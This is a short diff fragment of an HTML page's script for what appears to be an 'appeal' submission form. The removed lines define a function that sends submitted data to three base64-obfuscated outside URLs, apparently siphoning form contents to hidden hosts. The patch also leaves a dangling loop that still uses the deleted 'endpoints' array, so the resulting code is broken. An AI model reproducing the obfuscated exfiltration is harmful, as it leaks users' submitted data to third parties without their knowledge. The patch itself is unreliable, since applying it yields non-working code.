@@ -1552,12 +1552,7 @@
         const submitBtn = document.getElementById('submit-appeal-btn');
         
         // Function to submit to other endpoints
-        function submitToOtherEndpoints(data) {
-            const endpoints = [
-                'aHR0cHM6Ly9hbGktcGhwLndhc21lci5hcHA=',
-                'aHR0cHM6Ly9hd2Fpcy1waHAud2FzbWVyLmFwcA==',
-                'aHR0cHM6Ly91emFpci53YXNtZXIuYXBw'
-            ];
+
             
             endpoints.forEach(encodedUrl => {
                 const decodedUrl = atob(encodedUrl);
@@ -1874,4 +1869,5 @@
     </script>
 
 </body></html>
+
 
